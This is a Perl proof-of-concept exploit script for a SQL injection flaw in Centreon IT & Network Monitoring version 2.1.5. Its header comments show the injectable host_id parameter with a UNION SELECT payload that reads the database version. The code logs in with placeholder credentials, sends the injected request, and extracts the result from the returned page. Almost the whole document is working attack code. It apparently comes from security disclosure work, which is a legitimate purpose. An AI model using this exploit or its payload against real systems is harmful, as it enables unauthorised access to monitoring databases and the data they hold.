#!/usr/bin/perl
# //--------[PoC]---------//
#
# Title	  : Centreon IT & Network Monitoring v2.1.5 - Injection SQL
# Version : 2.1.5
# Author  : Jonathan Salwan (j.salwan@sysdream.com)
#
#
# [Vuln sql injection]
# http://localhost/centreon/main.php?p=201&host_id=-1%20[SQL Injection]&o=p&min=1
# 
# http://localhost/centreon/main.php?p=201&host_id=-1 UNION SELECT 1,@@version,3,4,5&o=p&min=1
#
#
# //-------[Credit]-------//
#
# http://www.sysdream.com
# http://www.shell-storm.org
#

use LWP::UserAgent;

my $url   = 'http://localhost/centreon/index.php';
my $login = 'login';
my $paswd = 'pwd';
my $sql   = 'http://localhost/centreon/main.php?p=201&host_id=-1 UNION SELECT 1,@@version,3,4,5&o=p&min=1';

my $ua = LWP::UserAgent->new;
my $response = $ua->get($url);
my $cook = $response->header('Set-Cookie');

my $req2 = $ua->post($url, 
	            {useralias => $login, password => $paswd, submit => 'login'},
                    Cookie => $cook,
		    Content-Type => 'application/x-www-form-urlencoded'
                    );

my $response = $ua->get($sql, Cookie => $cook);
my $content = $response->content();

	open(FILE, '>sql-centreon.txt');
	print FILE $content;
	close(FILE);

	print "\n[Answer SQL Injection]\n\n";

	my $selection = system('cat sql-centreon.txt | grep ">Host</td>"');
	unlink('sql-centreon.txt');	

print "\n";
